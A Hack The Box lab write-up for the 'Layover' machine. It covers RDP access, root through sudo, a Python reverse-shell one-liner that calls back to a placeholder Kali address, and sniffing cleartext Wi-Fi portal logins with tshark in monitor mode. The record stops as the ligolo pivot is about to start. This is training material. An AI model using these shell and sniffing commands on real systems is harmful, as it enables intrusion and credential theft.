---
link: https://app.hackthebox.com/machines/Layover
difficulty: Medium
os: Linux
pov: red
release date: 2026-09-26
tags:
  - SN_12
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2776-5507-42ae-b9d0-3346ff823ce7-1789977190.png
solved:
solve date:
machine no.: 1
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Layover Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2776-5507-42ae-b9d0-3346ff823ce7-1789977190.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://app.hackthebox.com/users/1809572">nedmoeca</a></p>
    <p style="margin: 0;">Author(s): <a href="https://app.hackthebox.com/users/31190">TRX</a></p>
    <p style="margin: 0;">Difficulty: Medium</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Debrief


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Store the target address in a shell variable

**Command:**

```bash
IP=TARGET_IP
echo $IP
```

To clear the variable:

```bash
unset IP
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.3 Confirm target reachability

Before scanning, verify the host answers over the VPN and read the TTL for a first, free OS guess. A dead host wastes a long full-port scan; a live one with a tell-tale TTL saves you a question later.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ping`|Sends ICMP echo-request packets and waits for echo-replies to prove L3 reachability.|
|`-c 4`|Stop after 4 packets instead of running forever, so the command returns on its own.|
|`$IP`|Session variable holding the target address, resolved to TARGET_IP.|

**Result:**

```
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=220 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=269 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=215 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=217 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 215.351/230.282/269.199/22.518 ms
```

Key findings:

- Host is up: 4/4 replies, 0% packet loss (evidence).
- `ttl=63` implies an original TTL of 64 decremented by one hop, which is the Linux default, so the target is likely Linux (inference, to be confirmed by the service banners).
- Average RTT ~230 ms is pure VPN latency, so expect sluggish interactive sessions and plan to drop to a reverse shell early (inference).

**Next:** With the host confirmed alive, enumerate every open TCP port to map the full attack surface.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.4 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 1.4.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:**

```bash
# fast all-ports sweep, piped through the grapo helper to extract open ports
nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nmap -p-`|Scan all 65,535 TCP ports, not just nmap's top 1,000 default, so no odd service is missed.|
|`--min-rate 5000`|Send at least 5,000 packets/sec; counters the ~230 ms VPN latency that would otherwise make a full sweep crawl.|
|`-Pn`|Skip host-discovery ping and treat the host as up; reachability was already proven in 1.1.|
|`\| grapo`|Custom zsh helper: tees nmap output to the terminal and emits the open ports as a comma-separated list for reuse in the next scan.|

**Result:**

```
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 39.75 seconds

22,3389
```

**What this gives you:**

Key findings:

- Only two TCP ports are open across the full range: 22 (ssh) and 3389 (ms-wbt-server).
- `grapo` emits `22,3389` as a ready-to-paste port list for the targeted scan.
- A very small external surface with no web port is an early sign the real targets sit on an internal segment (pivoting).

**Next:** Run a version and default-script scan against only the two open ports to fingerprint the services and lock down the OS.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.2 Fingerprint services and OS on open ports

**Command:**

```bash
nmap -A -p 22,3389 TARGET_IP
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nmap -A`|Aggressive scan: enables `-sV` version detection, `-sC` default scripts, OS detection, and traceroute in one flag.|
|`-p 22,3389`|Restrict the heavy scan to the two confirmed-open ports from 1.2, keeping it fast.|

**Result:**

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.3 Scan Results Analysis

|Port|Service|Version|Analysis|Simple Explanation|
|---|---|---|---|---|
|22/tcp|ssh|OpenSSH 9.6p1 Ubuntu 3ubuntu13.19|Ubuntu banner confirms Linux; SSH is restricted on this box, so not the intended entry despite having creds.|The normal remote-login door. It's locked to us here, so we don't use it to get in.|
|3389/tcp|ms-wbt-server|Microsoft Terminal Service (xrdp)|RDP on Linux = xrdp; PAM-backed graphical desktop. Supplied creds `contractor / Contractor2026!` target this.|A "remote screen" door. On Linux this is xrdp, giving a full graphical desktop instead of a text shell. This is our way in.|

**What this gives you:**

Key findings:

- Target OS is Ubuntu Linux, confirmed by the OpenSSH banner. The conflicting "MikroTik RouterOS" OS-detection guess is flagged unreliable by nmap's own warning (no open+closed port pair for the fingerprint) and is discarded.
- RDP on a Linux host indicates xrdp; because xrdp authenticates against local PAM, the handed-out RDP credentials are also local user credentials.
- Absence of any external web service (no 80/443) confirms the target web application lives on an unreachable internal segment, consistent with a pivoting engagement.

**Next:** Use the supplied `contractor / Contractor2026!` credentials against xrdp on 3389 to land a graphical foothold on the workstation; SSH is restricted, so RDP is the intended entry.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Initial Access: Foothold via RDP (xrdp)

### Connect to the Linux desktop as contractor:

**Why this step:** Recon showed xrdp on 3389 and supplied `contractor / Contractor2026!`, with SSH not accepting this account. RDP is the intended door, so use it to land a graphical session on the workstation.

**Command:**

bash

```bash
xfreerdp3 /v:TARGET_IP /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution /sec:tls
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`xfreerdp3`|FreeRDP 3 command-line RDP client. Every option is a single unbroken `/flag:value` token; a space after the colon splits the argument and aborts with "Unsupported command line syntax."|
|`/v:TARGET_IP`|The victim host to connect to.|
|`/u:contractor`|Username supplied by HTB.|
|`/p:'Contractor2026!'`|Password, single-quoted so Bash treats `!` literally instead of triggering history expansion. No space between `/p:` and the value.|
|`/cert:ignore`|xrdp presents a self-signed certificate Kali does not trust; connect anyway rather than aborting on validation.|
|`/dynamic-resolution`|Allow the RDP window to resize dynamically, keeping the laggy desktop workable.|
|`/sec:tls`|Force TLS security negotiation, which modern xrdp expects.|

**Result:** Session established. Title bar shows `FreeRDP: TARGET_IP`; desktop is XFCE logged in as `contractor`. Log output confirms a successful connect (framebuffer init, dynamic virtual channels `ainput` / `rdpgfx` / `disp` / `rdpsnd` loaded); the `/p is insecure`, `/cert:ignore` DANGER, and `BB_ERROR_BLOB` license warnings are benign and expected against xrdp.

![[layover_rdp_desktop.png]]

**What this gives you:**

Key findings:

- Graphical foothold as the `contractor` user on the workstation (host `airside-ws01`, to be confirmed at a terminal prompt).
- The desktop is Linux XFCE served by xrdp, giving GUI access (useful later for the Wi-Fi network applet) but not a fast shell.

**Next:** Open a terminal in the Xfce session and check `sudo -l` to assess local privilege on the workstation before doing any heavier work.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Privilege Escalation (Workstation): sudo misconfiguration → root

### 3.1 Enumerate sudo rights for contractor:

**Why this step:** With a shell as `contractor` on airside-ws01 (2.1), the fastest local-privilege check is the sudo policy. A permissive entry is the most common instant-win on Linux.

**Command:**

```bash
sudo -l
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`sudo -l`|List the sudo privileges granted to the current user, as defined in `/etc/sudoers`, without running anything. Prompts for the user's own password on first use.|

**Result:**

```
Matching Defaults entries for contractor on airside-ws01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User contractor may run the following commands on airside-ws01:
    (ALL : ALL) ALL
```

**What this gives you:**

Key findings:

- `contractor` may run `(ALL : ALL) ALL`: any command, as any user, as any group, on this host. This is full administrative control.
- Escalation requires only contractor's own password (already known), with no restriction on the command.

###### Reading the sudoers grant:

The entry `(ALL : ALL) ALL` has three fields. The first `ALL` is the set of users the command may be run as (any user, root included). The `ALL` inside the parentheses is the set of groups it may be run as. The final `ALL` is the set of permitted commands. All three being `ALL` means the user can execute any command as anyone, which is equivalent to unrestricted root.

**Next:** Invoke a root shell with `sudo su` to take full control of the workstation, then use that access to enumerate network interfaces for the pivot.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Escalate to root on the workstation:

**Why this step:** `sudo -l` (3.1) returned `(ALL : ALL) ALL`, so a root shell is one command away. Take it to unlock root-only resources, principally the network interfaces needed for the pivot.

**Command:**

```bash
sudo su
whoami ; id
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`sudo su`|Run `su` (switch user, defaulting to root) under sudo. Because the sudoers entry permits any command as any user, this drops straight into a root shell. Reuses the cached sudo timestamp, so no re-prompt.|
|`whoami ; id`|Confirm the new identity: `whoami` prints the username, `id` prints the full uid/gid/groups so there is no doubt about the privilege level.|

**Result:**

```
root@airside-ws01:/home/contractor# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
```

**What this gives you:**

Key findings:

- Full root (`uid=0`) on airside-ws01, confirmed by `id`.
- No user or root flag resides on this host; its value is as a pivot. Root is required for the next phase (bringing up and reconfiguring the hidden wireless interfaces).

**Next:** Enumerate all network interfaces as root to find the pivot path inward; the external interface only reaches HTB, so look for additional (likely wireless) segments.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Internal Network Discovery

### 4.1 Enumerate network interfaces on the pivot:

**Why this step:** Root on airside-ws01 (3.2) is only useful for what it reaches. The external interface sees HTB but not the internal targets, so enumerate every interface to find the inward path.

**Command:**

```bash
ip -br a
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip -br a`|`ip address` in brief mode: one line per interface showing name, operational state, and assigned addresses. Fast way to spot non-standard interfaces.|

**Result:**

```
lo               UNKNOWN        127.0.0.1/8 ::1/128
wlan2            DOWN
wlan3            DOWN
eth0@if11        UP             TARGET_IP/24 metric 100 fd42:3ff5:6554:20e5:216:3eff:fe83:ea41/64 fe80::216:3eff:fe83:ea41/64
```

**What this gives you:**

Key findings:

- `eth0@if11` is the external (HTB-facing) interface holding the workstation's 10.x.x.x/24 address; the `@if11` suffix marks it as one end of a veth pair (container networking). Per the engagement notes, this interface must not be used as the pivot route.
- `wlan2` and `wlan3` are two wireless interfaces, both `DOWN`. Wireless radios on a workstation indicate simulated Wi-Fi via the kernel `mac80211_hwsim` module.
- The two radios serve distinct roles in the plan: `wlan2` as the client interface to associate with the internal Wi-Fi (obtaining an address on the hidden internal subnet), and `wlan3` as a monitor-mode interface to sniff traffic on that network.

###### What mac80211_hwsim is (beginner theory):

A normal Wi-Fi interface is backed by a physical radio (a PCIe or USB card). In a virtualized HTB box there is no physical hardware, so the Linux kernel loads `mac80211_hwsim`, a module that creates fully software-simulated wireless radios. To every userland tool (`iw`, `nmcli`, `wpa_supplicant`, `tshark`) these behave exactly like real adapters: they can scan for access points, associate with an SSID, pull a DHCP lease, and be flipped into monitor mode. The box uses this to build an internal wireless network segment that is only reachable from this workstation, which is precisely what forces the pivot.

**Next:** Bring up `wlan2` and scan for the internal access point to learn its SSID, channel, and security, then associate to obtain an address on the internal subnet.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Escape the RDP session to a stable reverse shell on Kali:

**Why this step:** The xrdp desktop is laggy and self-terminates, which would kill any in-progress work. A reverse shell is a plain TCP socket independent of the GUI, so it survives the desktop dropping and gives a fast terminal for the wireless and tunneling work ahead. For this hop the callback goes to Kali's `tun0`, because the workstation's external interface can reach the VPN.

**Command:**

```bash
# On Kali: start the listener FIRST (order matters; a late listener yields "Connection refused")
nc -lvnp 4444

# On airside-ws01 (root RDP terminal): fire the reverse shell to Kali tun0
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_TUN0_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nc -lvnp 4444`|Listener on Kali: `-l` listen, `-v` verbose (prints the connect line), `-n` no DNS, `-p 4444` port. Must be running before the client connects or the target gets `Connection refused`.|
|`python3 -c '...'`|One-liner reverse shell; Python is present on the target and reliable for this.|
|`socket.socket();s.connect(("KALI_TUN0_IP",4444))`|Open a TCP connection back to the Kali listener.|
|`os.dup2(s.fileno(),0/1/2)`|Duplicate the socket onto file descriptors 0, 1, 2 (stdin/stdout/stderr), rewiring the process's standard streams onto the network.|
|`subprocess.call(["/bin/bash","-i"])`|Spawn an interactive bash; with the streams already redirected, its I/O flows over the socket to Kali.|

**Result:**

```
listening on [any] 4444 ...
connect to [KALI_TUN0_IP] from (UNKNOWN) [TARGET_IP] 59582
root@airside-ws01:/home/contractor#
```

**Next:** Upgrade the dumb shell to a full PTY so `sudo`/`su`, job control, and line editing behave, then begin wireless enumeration on `wlan2`.
<div align="center">
<br>
<br>
</div>

###### Stabilize the shell to a full PTY

**Why this step:** The caught shell is a raw pipe with no controlling terminal, so `su`, `sudo`, and job control misbehave and an accidental Ctrl-C kills the session. Promote it to a real pseudo-terminal before doing interactive work.

**Command:**

```bash
# In the caught shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
# then press Ctrl-Z to background it

# On Kali:
stty raw -echo; fg
# press Enter twice
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`python3 -c 'import pty;pty.spawn("/bin/bash")'`|Allocate a pseudo-terminal and run bash inside it, giving the shell a real controlling TTY.|
|`export TERM=xterm-256color`|Tell programs what terminal type they are on, so screen-drawing tools (editors, pagers) render correctly.|
|`Ctrl-Z`|Suspend the local `nc`, returning control to Kali so terminal settings can be changed.|
|`stty raw -echo`|Put the local terminal in raw mode and disable local echo, so keystrokes pass straight to the remote PTY without double-printing.|
|`fg`|Resume `nc` in the foreground, reconnecting to the now-raw terminal.|

**Result:**

```
root@airside-ws01:/home/contractor#   (fully interactive: job control, su/sudo, and line editing now work)
```

**Next:** Bring `wlan2` up and scan for the internal access point to learn its SSID, channel, and security posture.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 Scan for the internal access point on wlan2

**Why this step:** `wlan2` is a client radio (4.1) but was down and silent. Bring it up and scan to learn the internal network's name, channel, and security before attempting to join, and to record the channel needed for monitor-mode sniffing later.

**Command:**

```bash
ip link set wlan2 up
iw dev wlan2 scan | grep -iE 'SSID|signal|DS Parameter|channel'
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip link set wlan2 up`|Enable the interface so its radio can transmit probe requests and receive beacons. A down radio hears nothing.|
|`iw dev wlan2 scan`|Perform an active 802.11 scan on wlan2, dumping every access point's beacon/probe-response details.|
|`grep -iE 'SSID\|signal\|DS Parameter\|channel'`|Filter the verbose scan to the fields that matter: network name, signal strength, and operating channel.|

**Result:**

```
        signal: -30.00 dBm
        SSID: HTB International WiFi
        DS Parameter set: channel 6
                 * Extended Channel Switching
                 * Multiple BSSID
                 * SSID List
```

**What this gives you:**

Key findings:

- Internal access point identified: SSID `HTB International WiFi`, operating on **channel 6**, signal `-30 dBm` (strong).
- No RSN/WPA information element present, so the network is **open** (no encryption). This permits association without a key and, crucially, means traffic traverses the air in cleartext and can be sniffed.
- Channel 6 is the value to tune the monitor interface (wlan3) to later; a monitor interface only receives on the single channel it is set to.

**Observation:** `wlan2` reads `DOWN` again in `ip -br a` immediately after a successful scan, indicating a service (NetworkManager or wpa_supplicant) is reclaiming the radio. Manual wireless management is therefore preferred for stable association and for monitor mode.

**Next:** Associate `wlan2` with the open AP and obtain a DHCP lease to gain an address on the internal subnet.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.4 Associate with the internal Wi-Fi and obtain a lease

**Why this step:** The AP is confirmed open on channel 6 (4.3). Associating `wlan2` and pulling a DHCP lease places the workstation on the internal subnet, the prerequisite for reaching the internal portal and for tunneling that network back to Kali.

**Command:**

```bash
nmcli device wifi connect "HTB International WiFi" ifname wlan2
ip -br a
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nmcli device wifi connect "HTB International WiFi"`|Instruct NetworkManager to associate with the named open SSID. For an unencrypted network no key argument is needed.|
|`ifname wlan2`|Bind the connection to the client radio (not wlan3, which is reserved for monitor-mode sniffing).|
|`ip -br a`|Verify the interface came up and received an address on the internal subnet.|

**Result:**

```
wlan2            UP             10.13.37.182/24 fe80::e8f1:faed:ebef:e243/64
```

**What this gives you:**

Key findings:

- `wlan2` is associated and holds `10.13.37.182/24`, placing the workstation on the internal network `10.13.37.0/24`.
- The workstation is now dual-homed: `eth0` on the HTB-facing net and `wlan2` on the internal net. All subsequent internal access (ligolo route advertisement, internal reverse-shell callbacks) uses the `wlan2` address `10.13.37.182`.
- The internal portal `portal.international.htb` is expected on this subnet (to be confirmed).

**Next:** Put the second radio `wlan3` into monitor mode on channel 6 and sniff the open network for cleartext credentials, since `contractor` creds do not work on the internal portal and another user's login must be captured.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.5 Confirm the internal portal and read the captive-portal notice

**Why this step:** With an address on `10.13.37.0/24` (4.4), verify the leaked target is reachable from the pivot and capture any information the captive portal exposes before committing to the sniffing attack.

**Command:**

```bash
ping -c 2 10.13.37.10
curl -s -I http://10.13.37.10/
curl -s http://wifi.international.htb/ 2>/dev/null | grep -iE 'portal|miles|international'
```

**Breakdown:**

| Component                                            | Reasoning                                                                                                             |
| ---------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `ping -c 2 10.13.37.10`                              | Confirm the portal host is up on the internal segment and read its TTL to gauge network distance.                     |
| `curl -s -I http://10.13.37.10/`                     | Fetch only HTTP response headers (`-I`) silently (`-s`) to fingerprint the web server without pulling the whole page. |
| `curl -s http://wifi.international.htb/ \| grep ...` | Retrieve the captive-portal page and filter for the leaked internal hostnames and paths.                              |

**Result:**

```
64 bytes from 10.13.37.10: icmp_seq=1 ttl=64 time=0.311 ms
64 bytes from 10.13.37.10: icmp_seq=2 ttl=64 time=0.254 ms

Server: nginx/1.24.0 (Ubuntu)
HTTP/1.1 200 OK
Content-Type: text/html

<title>HTB International WiFi</title>
  <a class="btn" href="http://portal.international.htb/">Accept &amp; continue to airport portal</a>
    <b>HTB Airways staff notice:</b> the <b>HTB Airways Miles</b> employee portal is
    <code>http://portal.international.htb/miles/</code>. Please sign in periodically to
    verify your Miles balance and lounge bookings.
```

Result (captive portal in RDP desktop browser):

![[layover_captive_portal.png]]

**What this gives you:**

Key findings:

- `10.13.37.10` is up with `ttl=64` and sub-millisecond RTT, indicating the portal is on the same L2 segment as `wlan2` (zero hops), directly reachable.
- Web server is `nginx/1.24.0 (Ubuntu)`, serving over plain HTTP (no TLS).
- The captive portal leaks the internal targets: `http://portal.international.htb/` (mapped to `10.13.37.10`) and the employee area `http://portal.international.htb/miles/`.
- The staff notice instructs employees to sign in periodically, which is what generates the authentication traffic the sniffing attack will capture.

**Next:** Because the network is open and the portal uses plain HTTP, put `wlan3` into monitor mode on channel 6 and passively capture HTTP POST logins to harvest a valid user's credentials.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. Credential Interception (Wireless Sniffing)

### 5.1 Put wlan3 into monitor mode on the AP's channel:

**Why this step:** The internal portal needs credentials that `contractor` does not have (4.5). The network is open and uses plain HTTP, so another user's login can be captured off the air. Monitor mode on the second radio lets wlan3 passively receive all 802.11 frames on the AP's channel without associating.

**Command:**

```bash
systemctl stop NetworkManager
killall wpa_supplicant 2>/dev/null
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
iw dev wlan3 info
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`systemctl stop NetworkManager`|Stop the service that would otherwise reclaim the radio and reset its mode/channel mid-capture.|
|`killall wpa_supplicant`|Kill any supplicant still holding a radio, for the same reason.|
|`ip link set wlan3 down`|An interface's type cannot be changed while it is up.|
|`iw dev wlan3 set type monitor`|Switch the radio from managed to monitor mode so it delivers every frame it hears, regardless of destination MAC.|
|`ip link set wlan3 up`|Bring the interface back up in the new mode.|
|`iw dev wlan3 set channel 6`|Tune the radio to the AP's channel (from 4.3); monitor mode only receives on the single channel it is set to.|
|`iw dev wlan3 info`|Verify the configuration: expect `type monitor` and `channel 6`.|

**Result:**

```
Interface wlan3
        ifindex 7
        addr 02:00:00:00:03:00
        type monitor
        wiphy 3
        channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
        txpower 20.00 dBm
```

**What this gives you:**

Key findings:

- `wlan3` is confirmed in `type monitor` on `channel 6`, ready to passively capture all traffic on the AP's frequency.
- With NetworkManager stopped, no service will reset the interface during capture.

###### Managed vs monitor mode (beginner theory):

A wireless interface normally runs in managed (infrastructure) mode, where the card's firmware filters out every frame not addressed to its own MAC address, plus broadcasts, to save CPU. That means a managed interface cannot see other clients' traffic. Monitor mode (RFMON) disables that filtering: the radio hands the operating system every 802.11 frame it receives on its current channel, no matter who it is addressed to. Two constraints follow. First, no other process may manage the radio, or it will keep knocking it out of monitor mode. Second, the radio only hears the one channel it is tuned to, so the capture channel must match the target AP's channel exactly; a mismatch produces an empty capture even though everything else is set up correctly.

**Next:** Run tshark on `wlan3` filtered to HTTP POST requests and wait for a staff login, extracting the submitted username and password fields.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.2 Capture cleartext credentials with tshark

**Why this step:** With wlan3 in monitor mode on channel 6 (5.1) and the portal using plain HTTP over an open network, a staff login can be read directly off the air. Filter for HTTP POST form submissions and extract the credential fields.

**Command:**

```bash
tshark -i wlan3 -a duration:120 \
  -Y 'http.request.method=="POST"' \
  -T fields -e frame.time -e wlan.sa -e ip.src -e http.host \
            -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`tshark -i wlan3`|Capture on the monitor-mode interface, which receives all frames on channel 6.|
|`-a duration:120`|Auto-stop after 120 seconds so the command returns; re-run with a longer window if no login occurs in that time.|
|`-Y 'http.request.method=="POST"'`|Display filter limiting output to HTTP POST requests, i.e. form submissions such as logins.|
|`-T fields`|Output selected fields only, rather than the default packet summary.|
|`-e frame.time -e wlan.sa -e ip.src -e http.host -e http.request.uri`|Print timestamp, sender MAC, source IP, target host, and request path for context.|
|`-e urlencoded-form.key -e urlencoded-form.value`|Print the decoded form field names and their values: the username and password.|

**Result:**

```
Oct  3, 2026 14:31:03 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
Oct  3, 2026 14:31:43 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
Oct  3, 2026 14:32:23 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
3 packets captured
```

**What this gives you:**

Key findings:

- Cleartext credentials captured: **`jenny` / `Fl1ghtDeck2026!`**, POSTed to `portal.international.htb/miles/login.php` from internal client `10.13.37.132`.
- The capture repeats on a ~40-second interval, confirming a scripted staff login and validating the channel/filter setup.
- These credentials belong to the internal portal (Craft CMS) and are reused to authenticate to the Craft control panel for the next phase.

###### Why the credentials were readable (theory):

Two missing protections stack here. The Wi-Fi is an open network, so frames are not encrypted at the link layer, and the portal serves over HTTP rather than HTTPS, so there is no TLS at the application layer either. With neither in place, the POST body travels as plaintext bytes that any monitor-mode radio tuned to the correct channel can read. Adding either WPA2 on the Wi-Fi or TLS on the site would have defeated this capture.

**Next:** Build a network tunnel from Kali through the pivot so Kali's browser and tooling can reach `portal.international.htb` directly, then log into the Craft CMS control panel as jenny.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Pivoting with ligolo-ng

### 6.1 Restore the internal Wi-Fi leg manually (post-NetworkManager)

**Why this step:** Stopping NetworkManager for monitor mode (5.1) dropped the wlan2 association, leaving it `DOWN`. The tunnel's agent forwards traffic out through wlan2, so the internal leg must be re-established first, this time with wpa_supplicant so it does not depend on the stopped NetworkManager.

**Command:**

```bash
pkill -9 -f "wpa_supplicant.*wlan2" 2>/dev/null; rm -rf /run/wpa_supplicant; mkdir -p /run/wpa_supplicant
ip link set wlan2 down; sleep 1; ip link set wlan2 up; sleep 2
cat > /tmp/wpa-open.conf <<'EOF'
ctrl_interface=/run/wpa_supplicant
update_config=1
network={
    ssid="HTB International WiFi"
    key_mgmt=NONE
    scan_ssid=1
}
EOF
wpa_supplicant -B -i wlan2 -c /tmp/wpa-open.conf -D nl80211 -f /tmp/wpa.log
sleep 6
iw dev wlan2 link
dhcpcd -t 15 wlan2 || dhclient wlan2
ip -br a show wlan2
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`pkill ...; rm -rf /run/wpa_supplicant; mkdir`|Clear any stale supplicant process and its control socket so a fresh instance can bind.|
|`ip link set wlan2 down; up`|Reset the interface cleanly before re-associating.|
|heredoc `/tmp/wpa-open.conf`|Minimal supplicant config. `key_mgmt=NONE` declares an open network (no PSK negotiation); `scan_ssid=1` actively probes for the SSID.|
|`wpa_supplicant -B -i wlan2 -c ... -D nl80211 -f ...`|Run the supplicant backgrounded on wlan2 with that config, using the nl80211 driver, logging to `/tmp/wpa.log`.|
|`iw dev wlan2 link`|Confirm association to the AP.|
|`dhcpcd -t 15 wlan2 \| dhclient wlan2`|Request a DHCP lease (dhcpcd, falling back to dhclient).|
|`ip -br a show wlan2`|Verify the interface holds an internal address.|

**Result:**

```
wlan2: connected to Access Point: HTB International WiFi
wlan2: offered 10.13.37.183 from 10.13.37.1
wlan2: leased 10.13.37.183 for 43200 seconds
wlan2: adding route to 10.13.37.0/24
wlan2            UP             10.13.37.183/24 fe80::ebc3:c708:b5e:e7a7/64
```

**What this gives you:**

Key findings:

- `wlan2` is re-associated via wpa_supplicant and holds `10.13.37.183/24` (the lease differs from the earlier `.182`; the current internal address is `10.13.37.183`).
- This address is the one later internal reverse-shell callbacks must target, because the internal portal cannot route to Kali.
- Monitor-mode `wlan3` is unaffected; the two radios are independent.

**Next:** Transfer the ligolo agent to the pivot, start the proxy on Kali, connect the agent, and autoroute the internal `/24`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

